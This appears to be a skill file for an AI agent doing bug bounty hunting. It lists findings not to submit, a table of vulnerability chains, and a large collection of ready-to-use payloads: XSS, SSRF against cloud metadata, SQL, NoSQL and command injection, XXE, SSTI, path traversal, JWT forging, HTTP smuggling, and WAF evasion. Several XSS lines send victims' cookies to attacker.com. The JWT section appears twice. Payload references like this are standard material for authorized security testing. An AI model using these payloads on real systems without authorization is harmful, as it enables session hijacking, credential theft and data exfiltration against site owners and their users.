---
name: security-arsenal
description: Payload reference, bypass tables, WAF detection, conditionally-valid chains, and the NEVER SUBMIT list. Use when you need specific payloads, when validating findings, or when checking if a finding is submittable.
---

# SECURITY ARSENAL — PAYLOADS, BYPASS, AND SUBMISSION RULES

---

## NEVER SUBMIT LIST

These findings are NEVER valid alone. Do not waste time or program goodwill.

```
NEVER SUBMIT (standalone):
  Missing CSP / HSTS / security headers
  Missing SPF / DKIM / DMARC
  GraphQL introspection alone (without auth bypass)
  Banner / version disclosure without CVE exploit
  Clickjacking on non-sensitive pages
  Tabnabbing
  CSV injection (no code execution)
  CORS wildcard without credentialed exfil
  Logout CSRF
  Self-XSS
  Open redirect alone (without OAuth chain)
  OAuth client_secret in mobile app
  SSRF DNS callback only (without internal access)
  Host header injection alone (without reset poisoning)
  Rate limit on non-critical forms
  Session not invalidated on logout
  Concurrent sessions
  Internal IP in error message
  Missing HttpOnly / Secure cookie flags alone
  Server version disclosure
  X-Powered-By header
  Cookie without SameSite flag
  HTML form without CSRF token (if no state change)
  Auto-complete on password field
  Clickjacking on login page
```

---

## CONDITIONALLY VALID — CHAIN REQUIRED

These findings are only valid when chained with something else.

| Standalone Finding | Chain Required | Valid Result | Severity |
|---|---|---|---|
| Open redirect | + OAuth redirect_uri abuse | ATO | Critical |
| Clickjacking | + sensitive action + PoC | Account actions | Medium |
| CORS wildcard | + credentialed exfil | Data theft | High |
| CSRF | + sensitive action (email change, password change) | ATO | High |
| Rate limit bypass | + OTP brute succeeds | ATO | Medium/High |
| SSRF DNS-only | + internal data return | Network exposure | Medium |
| Host header injection | + password reset poisoning | ATO | High |
| Prompt injection | + reads other user's data | Data breach | High |
| S3 bucket listing | + JS bundles with secrets | Credential theft | Medium/High |
| Self-XSS | + CSRF to trigger on victim | Session hijack | Medium |
| Subdomain takeover | + OAuth redirect_uri chain | ATO | Critical |
| GraphQL introspection | + auth bypass mutation | Data exfil | High |

---

## XSS PAYLOADS

### Basic Probes

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
' ><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft

```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass

```javascript
// unsafe-inline blocked → use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
// nonce present → find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>
// Angular template injection
{{constructor.constructor('alert(1)')()}}
// mXSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

### DOM XSS Sources → Sinks

**Sources**: `location.hash, location.search, location.href, document.referrer, window.name, document.URL`
**Sinks**: `innerHTML, outerHTML, document.write, eval, setTimeout(string), setInterval(string), new Function, element.src, element.href`

---

## SSRF PAYLOADS

### Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### 11 IP Bypass Techniques

| # | Technique | Example |
|---|-----------|---------|
| 1 | Decimal IP | `http://2130706433` |
| 2 | Octal IP | `http://0177.0.0.1` |
| 3 | Hex IP | `http://0x7f000001` |
| 4 | Short IP | `http://127.1` |
| 5 | IPv6 | `http://[::1]` |
| 6 | IPv6 mapped | `http://[::ffff:127.0.0.1]` |
| 7 | DNS rebinding | Attacker DNS → internal IP |
| 8 | Redirect chain | External → 302 → internal |
| 9 | URL parser confusion | `http://attacker.com#@internal` |
| 10 | CNAME to internal | Attacker domain → internal hostname |
| 11 | Full-width period | `http://127。0。0。1` |

---

## SQL INJECTION PAYLOADS

### Detection

```sql
'
''
'))
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--
'; SELECT SLEEP(5)--
' OR SLEEP(5)--
```

### WAF Bypass

```sql
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
SeLeCt * FrOm uSeRs
%27 OR %271%27=%271
```

---

## XXE PAYLOADS

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

---

## NOSQL INJECTION

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.username == 'admin'"}
```

---

## COMMAND INJECTION

```bash
; id
| id
` id `
$(id)
&& id
|| id
```

---

## SSTI DETECTION

```
{{7*7}}      → 49 = Jinja2/Twig
${7*7}       → 49 = Freemarker/Spring EL
<%= 7*7 %>   → 49 = ERB/EJS
#{7*7}       → 49 = Mako/Pebble
*{7*7}       → 49 = Spring Thymeleaf
{{7*'7'}}    → 7777777 = Jinja2 (not Twig)
```

---

## PATH TRAVERSAL

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd%00.jpg
```

---

## JWT ATTACKS

```bash
# None algorithm: decode, change alg to "none", remove signature
# Secret brute: hashcat -a 0 -m 16500 jwt.txt rockyou.txt
# RS256→HS256: sign with PUBLIC key as secret
```

---

## HTTP SMUGGLING

```http
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8

SMUGGLED

0
```

---

## WAF BYPASS REFERENCE

### Soft Block Detection

| WAF | Signature |
|-----|-----------|
| Cloudflare JS challenge | `200 OK` + `cf-challenge-form` body |
| F5 BIG-IP | `200 OK` + "The requested URL was rejected" |
| Imperva | `200 OK` + CAPTCHA page + `_Incapsula_Resource` |

**401 and 500 are POSITIVE signals:**
- `401` = you reached auth middleware (past WAF)
- `500` = payload triggered backend exception

### Universal Bypass

```bash
%253Cscript%253E    # Double encoding
%u003cscript%u003e   # Unicode
<ScRiPt>            # Case variation
<scr/**/ipt>        # Comments
%00<script>         # Null bytes
```

---

## JWT ATTACKS

```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt

# RS256→HS256 algorithm confusion
# If server uses RS256 (public key), try signing with HS256 using PUBLIC key as secret
```
